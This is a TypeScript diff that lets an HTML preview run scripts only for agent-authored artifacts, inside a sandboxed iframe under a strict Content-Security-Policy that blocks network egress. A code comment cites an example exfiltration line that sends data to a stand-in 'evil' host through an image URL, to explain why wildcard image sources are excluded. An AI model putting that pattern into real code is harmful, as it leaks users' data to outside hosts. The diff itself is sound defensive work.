@@ -7,6 +7,30 @@ export interface StaticHtmlPreviewOptions {
   fileDir: string
   resolveAsset: ResolveAsset
   readTextAsset: (absPath: string) => string | undefined
+  /** Artifact scope only ([spec:SP-0fc9]): keep scripts so an agent-authored prototype is
+   *  actually clickable. The iframe grants allow-scripts (opaque origin — no app DOM, no
+   *  cookies, no storage) and the CSP below blocks egress. Every other scope stays static:
+   *  a worktree .html is arbitrary content (node_modules, fetched fixtures), not a deliverable. */
+  allowScripts?: boolean
+  /** Origin serving this artifact's subresources; the only one the CSP admits. */
+  assetOrigin?: string
+}
+
+/** Pinned subresources + no connect-src: a script may run, but it has nothing to phone home
+ *  with. `img-src *` would reopen exfiltration via `new Image().src = 'https://evil/?'+data`. */
+function interactiveCsp(assetOrigin: string | undefined): string {
+  const subresource = [assetOrigin, 'data:', 'blob:'].filter(Boolean).join(' ')
+  return [
+    "default-src 'none'",
+    "script-src 'unsafe-inline' 'unsafe-eval'",
+    "style-src 'unsafe-inline'",
+    `img-src ${subresource}`,
+    `media-src ${subresource}`,
+    `font-src ${[assetOrigin, 'data:'].filter(Boolean).join(' ')}`,
+    "connect-src 'none'",
+    "form-action 'none'",
+    "base-uri 'none'",
+  ].join('; ')
 }
 
 const REMOTE_OR_SPECIAL = /^(https?:|data:|blob:|mailto:|tel:|#|\/\/)/i
@@ -58,10 +82,18 @@ export function buildStaticHtmlPreview(opts: StaticHtmlPreviewOptions): string {
   const parser = new DOMParser()
   const doc = parser.parseFromString(neutralizeLinkHrefsForParsing(opts.html), 'text/html')
 
-  for (const script of Array.from(doc.querySelectorAll('script'))) script.remove()
-  for (const el of Array.from(doc.querySelectorAll('*'))) {
-    for (const attr of Array.from(el.attributes)) {
-      if (attr.name.toLowerCase().startsWith('on')) el.removeAttribute(attr.name)
+  if (opts.allowScripts) {
+    const meta = doc.createElement('meta')
+    meta.setAttribute('http-equiv', 'Content-Security-Policy')
+    meta.setAttribute('content', interactiveCsp(opts.assetOrigin))
+    // First in <head>: a meta CSP only governs what follows it.
+    doc.querySelector('head')?.prepend(meta)
+  } else {
+    for (const script of Array.from(doc.querySelectorAll('script'))) script.remove()
+    for (const el of Array.from(doc.querySelectorAll('*'))) {
+      for (const attr of Array.from(el.attributes)) {
+        if (attr.name.toLowerCase().startsWith('on')) el.removeAttribute(attr.name)
+      }
     }
   }
 
